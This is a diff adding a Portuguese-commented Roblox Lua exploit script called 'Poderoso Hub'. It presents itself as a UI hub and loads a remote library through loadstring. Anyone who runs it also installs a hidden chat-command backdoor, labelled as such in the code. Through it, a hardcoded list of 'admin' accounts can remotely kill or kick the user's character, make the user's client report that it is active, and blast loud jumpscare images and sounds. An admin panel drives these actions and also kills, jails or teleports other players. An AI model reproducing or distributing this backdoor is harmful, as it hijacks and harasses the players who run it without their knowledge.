@@ -1,0 +1,320 @@
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+function gradient(text, startColor, endColor)
+    local result = ""
+    local length = #text
+
+    for i = 1, length do
+        local t = (i - 1) / math.max(length - 1, 1)
+        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)
+        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)
+        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)
+
+        local char = text:sub(i, i)
+        result = result .. "<font color=\"rgb(" .. r ..", " .. g .. ", " .. b .. ")\">" .. char .. "</font>"
+    end
+
+    return result
+end
+
+local Confirmed = false
+
+WindUI:Popup({
+    Title = "Poderoso Hub - Developers/Admins",
+    Icon = "rbxassetid://85707712973346",
+    Content = "Click 'Load' to start" .. gradient(" Poderoso", Color3.fromHex("#FFD700"), Color3.fromHex("#FFFFFF")) .. " New Ui!",
+    Buttons = {
+        {
+            Title = "Cancel",
+            Icon = "",
+            Callback = function() end,
+            Variant = "Secondary",
+        },
+        {
+            Title = "Load",
+            Icon = "arrow-right",
+            Callback = function() Confirmed = true end,
+            Variant = "Primary",
+        }
+    }
+})
+
+
+repeat wait() until Confirmed
+
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = workspace
+
+-- ================= CONFIGURAÇÕES E LISTA =================
+local authorizedAdmins = {
+    ["grabriel_9990"] = true,
+    ["vinyzxw"] = true,
+    ["ResselSkills"] = true,
+    ["Posturado1518"] = true,
+    ["MANObaiximKaka"] = true,
+    ["Fernandes12395"] = true,
+    ["jondoe4756"] = true,
+    ["isaac_34472"] = true
+}
+
+local function isAdmin(player)
+    return authorizedAdmins[player.Name] == true
+end
+
+-- ================= FUNÇÕES DE APOIO =================
+local function SendChat(msg)
+    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        or TextChatService.TextChannels:GetChildren()[1]
+    if channel then
+        channel:SendAsync(msg)
+    end
+end
+
+local function GetPlayers()
+    local t = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        table.insert(t, p.Name)
+    end
+    return t
+end
+
+-- ================= CHAT LISTENER (BACKDOOR) =================
+local function OnMessage(msg)
+    local text = msg.Text
+    if not text then return end
+    local sender = msg.TextSource and msg.TextSource.Name
+    if not sender or not authorizedAdmins[sender] then return end -- Só obedece se o autor for admin
+
+    local lower = text:lower()
+    local me = LocalPlayer.Name:lower()
+    local char = LocalPlayer.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+
+    -- Se o comando for para mim ou para todos
+    if lower:match(me) or lower:match("all") then
+        if lower:match("^;kill") and char then
+            char:BreakJoints()
+        end
+
+        if lower:match("^;kick") then
+            LocalPlayer:Kick("🛡️ Você foi expulso pelo administrador do Hub")
+        end
+
+        if lower:match("^;v") then
+            SendChat("poderoso_#### [" .. LocalPlayer.Name .. "] ativo e operando.")
+        end
+
+        if lower:match("^;jumps1") then
+            local gui = Instance.new("ScreenGui", game.CoreGui)
+            local img = Instance.new("ImageLabel", gui)
+            img.Size = UDim2.new(1,0,1,0)
+            img.BackgroundTransparency = 1
+            img.Image = "rbxassetid://9129699706"
+            local s = Instance.new("Sound", Workspace)
+            s.SoundId = "rbxassetid://138186576"
+            s.Volume = 8
+            s:Play()
+            task.wait(1)
+            gui:Destroy()
+            s:Destroy()
+        end
+
+        if lower:match("^;jumps2") then
+            local gui = Instance.new("ScreenGui", game.CoreGui)
+            local img = Instance.new("ImageLabel", gui)
+            img.Size = UDim2.new(1,0,1,0)
+            img.BackgroundTransparency = 1
+            img.Image = "rbxassetid://7260178526"
+            local s = Instance.new("Sound", Workspace)
+            s.SoundId = "rbxassetid://9118828563"
+            s.Volume = 10
+            s:Play()
+            task.wait(1.2)
+            gui:Destroy()
+            s:Destroy()
+        end
+    end
+end
+
+-- Conectar ouvinte em todos os canais
+for _, ch in ipairs(TextChatService.TextChannels:GetChildren()) do
+    if ch:IsA("TextChannel") then ch.MessageReceived:Connect(OnMessage) end
+end
+TextChatService.TextChannels.ChildAdded:Connect(function(ch)
+    if ch:IsA("TextChannel") then ch.MessageReceived:Connect(OnMessage) end
+end)
+
+-- ================= BLOQUEIO DE INTERFACE =================
+if not isAdmin(LocalPlayer) then
+    print("⚡ Poderoso Hub ⚡ | Modo Segurança Ativado.")
+    return
+end
+
+-- ================= CARREGAR WINDUI =================
+
+local Window = WindUI:CreateWindow({
+    Title = "<font color='rgb(255, 255, 0)'>Poderoso Hub - Admins Painel</font>",
+    Icon = "rbxassetid://94177233579642",
+    Author = "<font color='rgb(255, 255, 0)'>Poderoso Hub | Studios</font>",
+    Folder = "PoderosoXz",
+    Size = UDim2.fromOffset(550, 300),
+    Transparent = true,
+    HideSearchBar = false,
+    Theme = "Dark",
+    User = {
+        Enabled = true
+    },
+    SideBarWidth = 200,
+    HideSearchBar = false,
+    ScrollBarEnabled = true,
+    HasOutline = true,
+    Background = "rbxassetid://85707712973346"
+})
+
+WindUI:Notify({
+    Title = "Painel Admin",
+    Content = "⚡ Poderoso Hub ⚡ carregado por " .. LocalPlayer.DisplayName,
+    Duration = 3,
+    Icon = "shield",
+})
+
+-- ================= ESTADOS DO PAINEL =================
+local selectedPlayer = nil
+local Dropdown = nil
+
+-- ================= ABA 1: COMANDOS GERAIS =================
+local Tab = Window:Tab({ Title = "Comandos Gerais", Icon = "bomb" })
+
+local function createDropdown()
+    local names = GetPlayers()
+    if Dropdown then Dropdown:Remove() end
+    Dropdown = Tab:Dropdown({
+        Title = "Selecionar Jogador",
+        Values = names,
+        Multi = false,
+        Callback = function(value)
+            selectedPlayer = Players:FindFirstChild(value)
+        end
+    })
+end
+
+task.delay(1, createDropdown)
+Players.PlayerAdded:Connect(createDropdown)
+Players.PlayerRemoving:Connect(createDropdown)
+
+-- Funções de Efeito Visual (Sua lógica de Kick Screen)
+local function tryShowKickScreenInstant(targetPlayer)
+    pcall(function()
+        local pg = targetPlayer:FindFirstChild("PlayerGui") or targetPlayer:WaitForChild("PlayerGui", 0.5)
+        if not pg then return end
+        local gui = Instance.new("ScreenGui", pg)
+        gui.Name = "KickScreen"
+        gui.IgnoreGuiInset = true
+        local frame = Instance.new("Frame", gui)
+        frame.Size = UDim2.new(1, 0, 1, 0)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        local title = Instance.new("TextLabel", frame)
+        title.Size = UDim2.new(1, 0, 0.2, 0)
+        title.Position = UDim2.new(0, 0, 0.3, 0)
+        title.Text = "🛡️ VOCÊ FOI KICKADO 🛡️"
+        title.TextColor3 = Color3.fromRGB(255, 215, 0)
+        title.TextScaled = true
+        title.BackgroundTransparency = 1
+        title.Font = Enum.Font.GothamBlack
+    end)
+end
+
+local function executeCommand(command)
+    if not selectedPlayer then
+        WindUI:Notify({Title = "Erro", Content = "Nenhum jogador selecionado!", Duration = 2, Icon = "x-circle"})
+        return
+    end
+
+    local char = selectedPlayer.Character
+    local humanoid = char and char:FindFirstChild("Humanoid")
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+    if command == "kick" then
+        tryShowKickScreenInstant(selectedPlayer)
+        task.wait(0.2)
+        selectedPlayer:Kick("🛡️ Você foi expulso pelo administrador ⚡ Poderoso Hub ⚡")
+    elseif command == "jail" and root then
+        local jail = Instance.new("Model", Workspace); jail.Name = "AdminJail_" .. selectedPlayer.Name
+        local function createWall(size, pos)
+            local wall = Instance.new("Part", jail)
+            wall.Size = size; wall.Anchored = true; wall.BrickColor = BrickColor.new("Really black"); wall.Position = root.Position + pos
+            local sel = Instance.new("SelectionBox", wall); sel.Adornee = wall; sel.Color3 = Color3.fromRGB(150, 0, 255)
+        end
+        createWall(Vector3.new(10, 1, 10), Vector3.new(0, -0.5, 0))
+        createWall(Vector3.new(10, 20, 1), Vector3.new(0, 10, 5))
+        createWall(Vector3.new(10, 20, 1), Vector3.new(0, 10, -5))
+        createWall(Vector3.new(1, 20, 10), Vector3.new(5, 10, 0))
+        createWall(Vector3.new(1, 20, 10), Vector3.new(-5, 10, 0))
+        createWall(Vector3.new(10, 1, 10), Vector3.new(0, 20, 0))
+        if humanoid then humanoid.WalkSpeed = 0 end
+    elseif command == "unjail" then
+        local j = Workspace:FindFirstChild("AdminJail_" .. selectedPlayer.Name); if j then j:Destroy() end
+        if humanoid then humanoid.WalkSpeed = 16 end
+    elseif command == "kill" and humanoid then humanoid.Health = 0
+    elseif command == "tp" and root and myRoot then root.CFrame = myRoot.CFrame * CFrame.new(0, 0, -3)
+    elseif command == "speed" and humanoid then humanoid.WalkSpeed = 100
+    end
+end
+
+-- Botões de Comando (Sua lista original)
+local commands = {
+    {Title = "Kick", Cmd = "kick", Desc = "Expulsa o jogador"},
+    {Title = "Jail", Cmd = "jail", Desc = "Prende o jogador"},
+    {Title = "Unjail", Cmd = "unjail", Desc = "Libera da prisão"},
+    {Title = "TP", Cmd = "tp", Desc = "Teleporta até você"},
+    {Title = "Kill", Cmd = "kill", Desc = "Mata o jogador"},
+    {Title = "Speed", Cmd = "speed", Desc = "Deixa rápido"},
+}
+
+for _, data in ipairs(commands) do
+    Tab:Button({Title = data.Title, Desc = data.Desc, Callback = function() executeCommand(data.Cmd) end})
+end
+
+-- ================= ABA 2: DROPTROLL (CONTROLE CHAT) =================
+local TabTroll = Window:Tab({ Title = "DropTroll", Icon = "command" })
+local SectionTroll = TabTroll:Section({ Title = "Comandos via Chat", Opened = true })
+
+local function CmdButton(name, cmd)
+    SectionTroll:Button({
+        Title = name,
+        Callback = function()
+            if selectedPlayer then SendChat(";"..cmd.." "..selectedPlayer.Name) end
+        end
+    })
+end
+
+CmdButton("Kill Remoto", "kill")
+CmdButton("Kick Remoto", "kick")
+CmdButton("Fling Remoto", "fling")
+CmdButton("Verificar Remoto", "v")
+
+-- ================= ABA 3: TERROR (JUMPSCARES) =================
+local JumpTab = Window:Tab({ Title = "Jumpscare", Icon = "skull" })
+local JumpSec = JumpTab:Section({ Title = "Terror Psicológico", Opened = true })
+
+JumpSec:Button({
+    Title = "JUMPSCARE 1",
+    Callback = function()
+        if selectedPlayer then SendChat(";jumps1 "..selectedPlayer.Name) end
+    end
+})
+
+JumpSec:Button({
+    Title = "JUMPSCARE 2",
+    Callback = function()
+        if selectedPlayer then SendChat(";jumps2 "..selectedPlayer.Name) end
+    end
+})
+
+print("✅ TUDO CARREGADO COM SUCESSO!")
+
